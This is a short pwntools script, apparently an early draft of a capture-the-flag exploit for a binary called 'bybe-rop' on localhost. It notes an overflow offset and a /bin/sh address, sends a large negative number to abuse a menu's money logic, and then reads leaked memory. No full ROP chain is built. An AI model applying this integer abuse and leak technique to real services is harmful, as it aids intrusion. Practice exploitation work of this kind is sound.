from pwn import *
#context.log_level = 'DEBUG'
# overflow at 136
# /bin/sh at 0x18a156

# p = process("./bybe-rop")
p = remote("localhost", 7778)

# get moni
p.recvuntil(b'choose: \n')
p.sendline(b'1')
p.recv()
p.sendline(b'-999999999')
p.recvuntil(b'choose: \n')

# leaks
p.sendline(b'2')
leaks = p.recv()
print(leaks)
p.close()



